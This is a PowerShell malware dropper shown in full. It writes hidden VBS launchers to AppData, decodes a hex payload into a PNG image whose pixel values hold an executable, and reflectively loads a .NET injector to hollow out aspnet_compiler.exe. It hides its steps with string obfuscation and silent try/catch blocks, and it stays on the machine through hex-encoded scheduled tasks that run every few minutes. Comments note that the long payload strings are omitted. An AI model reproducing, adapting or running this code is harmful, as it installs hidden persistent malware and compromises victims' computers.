$xa = "$env:USERPROFILE\AppData\Roaming\Logs"
New-Item $xa -ItemType Directory -Force
$Content = @'
set A = CreateObject("WScript.Shell")
A.run "powershell -ExecutionPolicy Bypass iex([IO.File]::ReadAllText('%USERPROFILE%\AppData\Roaming\Logs\Report.ps1'))",0
'@
[IO.File]::WriteAllText("$env:USERPROFILE\AppData\Roaming\Logs\Loader.vbs", $Content)
$Content = @'
set A = CreateObject("WScript.Shell")
A.run "powershell -ExecutionPolicy Bypass iex([IO.File]::ReadAllText('%USERPROFILE%\AppData\Roaming\Logs\install.ps1'))",0
'@
[IO.File]::WriteAllText("$env:USERPROFILE\AppData\Roaming\Logs\install.vbs", $Content)
function go {
param($Y6c)$Y6c = $Y6c -split '(..)' | ? { $_ }
ForEach ($chrome in $Y6c){[Convert]::ToInt32($chrome,16)}}
[byte[]] $bytes2  = go('8950...6082') # The omitted '8950...6082' is actually a 99229 character long string.
[io.file]::WriteAllBytes("$env:USERPROFILE\AppData\Roaming\Logs\t.png",$bytes2)
$Content = @'
function go {
param($HKCWZNBAW33)$HKCWZNBAW33 = $HKCWZNBAW33 -split '(..)' | ? { $_ }
ForEach ($RUXJCAAAAW in $HKCWZNBAW33){[Convert]::ToInt32($RUXJCAAAAW,16)}}
Add-Type -AssemblyName System.Drawing
[byte[]] $MyS  = go('4D5...000') # The omitted '4D5...000' is actually a 225281 character long hexadecimal/Base64 string.
$img2 = [System.Drawing.Image]::FromFile("$env:USERPROFILE\AppData\Roaming\Logs\t.png")
$injpath = "C:\Windows\Microsoft.NET\Framework\v4.0.30319\aspnet_compiler.exe"
$PE = New-Object 'Sy!!!!!!!!!!!!!!!!!!!!!stem.Collec!!!!!!!!!!!!!!!!!!!!!tions.Generic.!!!!!!!!!!!!!!!!!!!!!List[B!!!!!!!!!!!!!!!!!!!!!yte]'.Replace('!!!!!!!!!!!!!!!!!!!!!','')
  foreach($x in 1..$img2.Width ) {
      $PE.Add(($img2.GetPixel($x -1,0).R))
  }
  Try{
$x = [Reflection.Assembly]}catch{}
Try{
$load = 'Load'}catch{}
Try{
$HKCWZNBAW33 = 'NewPE.PE'}catch{}
Try{
$h = $x::$load($MyS).GetType($HKCWZNBAW33)}catch{}
Try{
Start-Sleep 1
$k = 'Execute'}catch{}
Try{
$o = $h.'GetMethod'($k)}catch{}
Try{
	Start-Sleep 1
$Z = 'C:\Windows\Microsoft.NET\Framework\v4.0.30319\aspnet_compiler.exe'}catch{}
Try{
Start-Sleep 1
$C = [OBJECT[]]}catch{}
Try{
$hh = $null,{$C}}catch{}
Try{
Start-Sleep 1
$o.Invoke($hh, ($Z,$PE.ToArray()))}catch{}
schtasks /delete /tn det /f
'@
[IO.File]::WriteAllText("$env:USERPROFILE\AppData\Roaming\Logs\Report.ps1", $Content)
function go {
param($Y6c)$Y6c = $Y6c -split '(..)' | ? { $_ }
ForEach ($chrome in $Y6c){[Convert]::ToInt32($chrome,16)}}
[byte[]] $bytes2  = go('747279200D0A7B0D0A7363687461736B732E657865202F637265617465202F746E20646574202F7363206D696E75746520202F73742030303A3130202F74722024656E763A5553455250524F46494C455C417070446174615C526F616D696E675C4C6F67735C4C6F616465722E7662730D0A0D0A7363687461736B732E657865202F637265617465202F746E2061646D696E6973746172746F72202F5343206D696E757465202F4D4F2033202F74722024656E763A5553455250524F46494C455C417070446174615C526F616D696E675C4C6F67735C4C6F616465722E7662730D0A7D206361746368207B207D')
[io.file]::WriteAllBytes("$env:USERPROFILE\AppData\Roaming\Logs\install.ps1",$bytes2)
Start-Sleep 6
start "$env:USERPROFILE\AppData\Roaming\Logs\install.vbs"